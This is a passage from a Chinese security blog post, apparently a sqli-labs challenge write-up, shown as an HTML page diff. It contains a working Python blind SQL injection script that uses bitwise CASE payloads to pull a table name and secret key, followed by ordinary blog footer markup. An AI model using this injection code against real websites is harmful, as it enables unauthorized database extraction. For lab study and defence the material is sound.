class="hljs-string">SELECT CASE ASCII(SUBSTRING((&#123;query&#125;), &#123;i&#125;, 1)) &amp; (&#123;bit_mark&#125;)</span><br><span class="hljs-string">    WHEN &#123;0&#125; THEN 1</span><br><span class="hljs-string">    WHEN &#123;1&#125; THEN 2</span><br><span class="hljs-string">    WHEN &#123;2&#125; THEN 3</span><br><span class="hljs-string">    WHEN &#123;3&#125; THEN 4</span><br><span class="hljs-string">    WHEN &#123;4&#125; THEN 5</span><br><span class="hljs-string">    WHEN &#123;5&#125; THEN 6</span><br><span class="hljs-string">    WHEN &#123;6&#125; THEN 7</span><br><span class="hljs-string">    ELSE 8</span><br><span class="hljs-string">END</span><br><span class="hljs-string">)+&#x27;</span><br><span class="hljs-string">    &quot;&quot;&quot;</span>.<span class="hljs-built_in">format</span>(*bit_values[:<span class="hljs-number">7</span>], query=query, bit_mark=bit_marks, i=i)<br>    payload = re.sub(<span class="hljs-string">r&#x27;\s+&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, payload.strip().replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot; &quot;</span>))<br>    <span class="hljs-comment"># print(payload)</span><br><br>    resp = requests.get(url, params=&#123;<span class="hljs-string">&quot;id&quot;</span>: payload&#125;)<br>    try_count += <span class="hljs-number">1</span><br><br>    infos = [<span class="hljs-string">&quot;Angelina&quot;</span>, <span class="hljs-string">&quot;Dummy&quot;</span>, <span class="hljs-string">&quot;secure&quot;</span>, <span class="hljs-string">&quot;stupid&quot;</span>, <span class="hljs-string">&quot;superman&quot;</span>, <span class="hljs-string">&quot;batman&quot;</span>, <span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;admin1&quot;</span>]<br><br>    <span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r&quot;Your Login name : (.*?)&lt;br&gt;&quot;</span>, resp.text)<br>    <span class="hljs-keyword">assert</span> <span class="hljs-keyword">match</span><br>    <span class="hljs-keyword">assert</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>) <span class="hljs-keyword">in</span> infos<br>    bits = bit_values[infos.index(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>))]<br>    <span class="hljs-keyword">return</span> bits<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_data</span>(<span class="hljs-params">query, length</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    获取query查询结果的length个字符，每个字符只获取其第7位和前5位</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    res = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, length+<span class="hljs-number">1</span>):<br>        b2 = extract_bits(query, i, [<span class="hljs-number">0b00000000</span>, <span class="hljs-number">0b00000001</span>, <span class="hljs-number">0b00000010</span>, <span class="hljs-number">0b00000011</span>, <span class="hljs-number">0b00000100</span>, <span class="hljs-number">0b00000101</span>, <span class="hljs-number">0b00000110</span>, <span class="hljs-number">0b00000111</span>])  <span class="hljs-comment"># 00000111</span><br>        b1 = extract_bits(query, i, [<span class="hljs-number">0b00000000</span>, <span class="hljs-number">0b00001000</span>, <span class="hljs-number">0b00010000</span>, <span class="hljs-number">0b00011000</span>, <span class="hljs-number">0b01000000</span>, <span class="hljs-number">0b01001000</span>, <span class="hljs-number">0b01010000</span>, <span class="hljs-number">0b01011000</span>])  <span class="hljs-comment"># 01011000</span><br>        <span class="hljs-keyword">if</span> b1 &amp; <span class="hljs-number">0b01000000</span> == <span class="hljs-number">0</span>:<br>            <span class="hljs-comment"># 该字符为数字</span><br>            bit = b1 | b2 | <span class="hljs-number">0b00100000</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 该字符为字母</span><br>            bit = b1 | b2<br>        res += <span class="hljs-built_in">chr</span>(bit)<br>    <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    table_name = extract_data(<span class="hljs-string">&quot;select table_name from information_schema.TABLES where TABLE_SCHEMA=&#x27;challenges&#x27; limit 1&quot;</span>, <span class="hljs-number">10</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;table_name:&quot;</span>, table_name)<br><br>    secret_key = extract_data(<span class="hljs-string">&quot;select c from (select 1 as a, 2 as b, 3 as c, 4 as d union select * from challenges.%s limit 1,1)x&quot;</span> % table_name, <span class="hljs-number">24</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;secret_key:&quot;</span>, secret_key)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Done. try_count:&quot;</span>, try_count)<br><br><br></code></pre></div></td></tr></table></figure>
+
+<p>请求次数是68次。</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Web%E5%AE%89%E5%85%A8/">Web安全</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/03/04/codeql-exercises-from-ql-tutorial/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">CodeQL官方教程中几道QL练习题</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/08/30/web-passive-scanner-based-on-mitmproxy/">
+                        <span class="hidden-mobile">基于mitmproxy实现web被动扫描代理</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'Ovi3/Ovi3.github.io');
+      s.setAttribute('issue-term', 'title');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+<script>
+
+function observeAndDisplay(sourceId, targetId) {
+  if (document.getElementById(sourceId)) {
+    new MutationObserver(m => {
+      m.forEach(m => {
+        if (m.target.textContent.trim() !== '') {
+          document.getElementById(targetId).style.display = 'inline';
+        }
+      });
+    })
+      .observe(
+        document.getElementById(sourceId),
+        { childList: true, characterData: true, subtree: true }
+      );
+  }
+
+}
+
+observeAndDisplay('busuanzi_value_page_pv', 'busuanzi_container_page_pv');
+observeAndDisplay('busuanzi_value_site_pv', 'busuanzi_container_site_pv');
+observeAndDisplay('busuanzi_value_site_uv', 'busuanzi_container_site_uv');
+
+
+</script>
+
+  <script defer src="https://cn.vercount.one/js?i=/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
